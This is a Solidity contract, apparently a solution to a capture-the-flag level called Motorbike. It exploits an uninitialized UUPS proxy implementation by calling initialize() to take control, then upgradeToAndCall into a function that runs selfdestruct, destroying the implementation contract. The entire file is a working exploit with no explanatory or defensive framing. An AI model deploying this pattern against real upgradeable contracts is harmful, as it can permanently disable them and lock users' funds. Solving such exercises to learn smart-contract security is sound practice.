// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import { IMotorbike } from "./IMotorbike.sol";


contract MotorbikeSolution {

    function killIt(IMotorbike _implementation) public {
        _implementation.initialize();
        _implementation.upgradeToAndCall(address(this), abi.encodeWithSignature("destruction()"));
    }

    function destruction() public {
        selfdestruct(tx.origin);
    }


}
